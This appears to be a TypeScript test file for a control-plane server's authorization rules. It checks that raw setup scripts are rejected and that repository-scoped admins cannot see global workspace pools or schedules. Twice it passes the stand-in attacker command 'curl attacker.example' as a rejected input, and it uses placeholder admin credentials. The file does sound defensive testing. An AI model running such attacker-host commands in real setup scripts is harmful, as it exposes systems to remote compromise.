import { describe, expect, it } from "vitest";

import { AuthService } from "./auth.ts";
import { ControlPlane } from "./control-plane.ts";
import { createLocalApp } from "./local-server.ts";
import { invokeHandler } from "../test-helpers/local-server-test-helpers.ts";

describe("workspace route scope", () => {
  it("keeps setup scripts on the privileged pool configuration surface", async () => {
    let nextPool = 0;
    const plane = new ControlPlane({ workspacePoolIdFactory: () => `pool-${++nextPool}` });
    plane.createCommand({ id: "command-1", name: "echo", argv: ["echo"], providerId: null });
    const { handler } = createLocalApp({
      plane,
      rateLimitConfig: { enabled: false },
    });
    const invoke = (method: string, path: string, body?: unknown) =>
      invokeHandler(handler, method, path, body);

    const created = await invoke("POST", "/api/v1/workspace-pools", {
      name: "trusted",
      setupProfiles: [{ id: "ready", name: "Ready", script: "echo secret" }],
      defaultSetupProfileId: "ready",
    });
    expect(created.status).toBe(201);
    expect(created.json).toMatchObject({
      id: "pool-1",
      setupProfiles: [{ id: "ready", script: "echo secret" }],
      destroyWorkspaceAfter: false,
    });
    expect((await invoke("GET", "/api/v1/workspace-pools")).json).toMatchObject({
      items: [{ id: "pool-1", setupProfiles: [{ id: "ready", name: "Ready" }] }],
    });
    expect(await invoke("GET", "/api/v1/workspace-pools/pool-1/exec-config")).toMatchObject({
      status: 200,
      json: { setupProfiles: [{ script: "echo secret" }] },
    });

    const rawSession = await invoke("POST", "/api/v1/sessions", {
      repositoryId: null,
      workspacePoolId: "pool-1",
      prompt: "run",
      target: { commandId: "command-1" },
      timeout: 30,
      setupScript: "curl attacker.example",
    });
    expect(rawSession).toMatchObject({
      status: 400,
      json: { error: { message: "setupScript is not accepted; use setupProfileId" } },
    });
    const rawSchedule = await invoke("POST", "/api/v1/schedules", {
      repositoryId: null,
      workspacePoolId: "pool-1",
      name: "unsafe",
      target: { commandId: "command-1" },
      cron: "* * * * *",
      timeout: 30,
      setupScript: "curl attacker.example",
    });
    expect(rawSchedule).toMatchObject({
      status: 400,
      json: { error: { message: "setupScript is not supported for workspace schedules" } },
    });

    expect(
      await invoke("PATCH", "/api/v1/workspace-pools/pool-1", {
        name: "trusted-renamed",
      }),
    ).toMatchObject({ status: 200, json: { name: "trusted-renamed" } });
    expect((await invoke("DELETE", "/api/v1/workspace-pools/pool-1")).status).toBe(204);
    expect((await invoke("GET", "/api/v1/workspace-pools/pool-1")).status).toBe(404);
  });

  it("hides global workspace pools and schedules from repository-scoped principals", async () => {
    const plane = new ControlPlane({ workspacePoolIdFactory: () => "pool-1" });
    plane.createCommand({ id: "command-1", name: "echo", argv: ["echo"], providerId: null });
    expect(plane.createWorkspacePool({ name: "pool" }).ok).toBe(true);
    expect(
      plane.putSchedule({
        id: "schedule-1",
        repositoryId: null,
        workspacePoolId: "pool-1",
        name: "workspace schedule",
        target: { commandId: "command-1" },
        cron: "* * * * *",
        timeout: 30,
      }).ok,
    ).toBe(true);

    const admins = Buffer.from(
      JSON.stringify([{ username: "root", password: "password" }]),
    ).toString("base64url");
    const auth = new AuthService({ mode: "required", secret: "s".repeat(32), admins });
    const { apiKey } = await auth.createServiceAccount({
      name: "scoped-admin",
      role: "admin",
      allowedRepositoryIds: ["repo-1"],
    });
    const { handler } = createLocalApp({
      plane,
      authService: auth,
      rateLimitConfig: { enabled: false },
    });
    const invoke = (method: string, path: string, body?: unknown) =>
      invokeHandler(handler, method, path, body, { authorization: `Bearer ${apiKey}` });

    expect((await invoke("GET", "/api/v1/workspace-pools")).status).toBe(404);
    expect((await invoke("GET", "/api/v1/workspace-pools/pool-1/exec-config")).status).toBe(403);
    expect((await invoke("GET", "/api/v1/schedules")).json).toMatchObject({ items: [] });
    expect((await invoke("GET", "/api/v1/schedules/schedule-1")).status).toBe(404);
    expect((await invoke("POST", "/api/v1/schedules/schedule-1/trigger", {})).status).toBe(404);
    expect(
      (
        await invoke("POST", "/api/v1/schedules", {
          repositoryId: null,
          workspacePoolId: "pool-1",
          name: "another workspace schedule",
          target: { commandId: "command-1" },
          cron: "* * * * *",
          timeout: 30,
        })
      ).status,
    ).toBe(404);
  });
});
